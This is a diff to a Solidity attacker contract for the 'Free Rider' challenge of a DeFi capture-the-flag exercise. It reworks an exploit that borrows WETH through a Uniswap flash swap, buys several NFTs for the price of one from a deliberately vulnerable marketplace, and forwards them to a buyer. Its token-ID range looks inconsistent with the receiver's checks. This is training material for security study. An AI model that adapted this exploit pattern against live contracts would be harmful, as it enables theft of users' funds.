@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.12;
 
+import "forge-std/Test.sol";
 import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
 import {ReentrancyGuard} from "openzeppelin-contracts/security/ReentrancyGuard.sol";
 import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
@@ -32,6 +33,7 @@ contract Attacker is IERC721Receiver, ReentrancyGuard {
 
     IERC721 private immutable _nft;
     uint256 private _received;
+    uint256[] tokenIds;
 
     constructor(
         address attacker_,
@@ -48,6 +50,7 @@ contract Attacker is IERC721Receiver, ReentrancyGuard {
         IERC721(nft_).setApprovalForAll(msg.sender, true);
         freeRiderNFTMarketplace = FreeRiderNFTMarketplace(marketplace);
         uniswapV2Factory = IUniswapV2Factory(factory);
+        weth = WETH9(payable(tokenB));
         uniswapV2Pair = IUniswapV2Pair(
             uniswapV2Factory.getPair(tokenA, tokenB)
         );
@@ -70,7 +73,8 @@ contract Attacker is IERC721Receiver, ReentrancyGuard {
     ) external {
         require(msg.sender == address(uniswapV2Pair), "not pair");
         require(sender == address(this), "not sender");
-
+        weth.withdraw(weth.balanceOf(address(this)));
+        console.log(address(this).balance);
         (address tokenBorrow, address caller) = abi.decode(
             data,
             (address, address)
@@ -78,16 +82,13 @@ contract Attacker is IERC721Receiver, ReentrancyGuard {
 
         // Your custom code would go here. For example, code to arbitrage.
         require(tokenBorrow == address(weth), "token borrow != WETH");
-        uint256 counter = 0;
-        uint256[] memory tokenIds;
-        for (
-            counter;
-            counter < _nft.balanceOf(address(freeRiderNFTMarketplace));
-            counter++
-        ) {
-            tokenIds[counter] = counter;
+        uint256 counter = 1;
+
+        for (counter; counter < 7; counter++) {
+            tokenIds.push(counter);
         }
-        freeRiderNFTMarketplace.buyMany(tokenIds);
+
+        freeRiderNFTMarketplace.buyMany{value: 15 ether}(tokenIds);
         // about 0.3% fee, +1 to round up
         uint fee = (amount1 * 3) / 997 + 1;
         uint256 amountToRepay = amount1 + fee;
@@ -114,14 +115,10 @@ contract Attacker is IERC721Receiver, ReentrancyGuard {
         require(_tokenId >= 0 && _tokenId <= 5);
         require(_nft.ownerOf(_tokenId) == address(this));
 
-        _received++;
-        if (_received == 6) {
-            uint256 i;
-            for (i = 0; i < _received; i++) {
-                _nft.transferFrom(address(this), address(_buyer), i);
-            }
-        }
+        _nft.transferFrom(address(this), address(_buyer), _tokenId);
 
         return IERC721Receiver.onERC721Received.selector;
     }
+
+    receive() external payable {}
 }
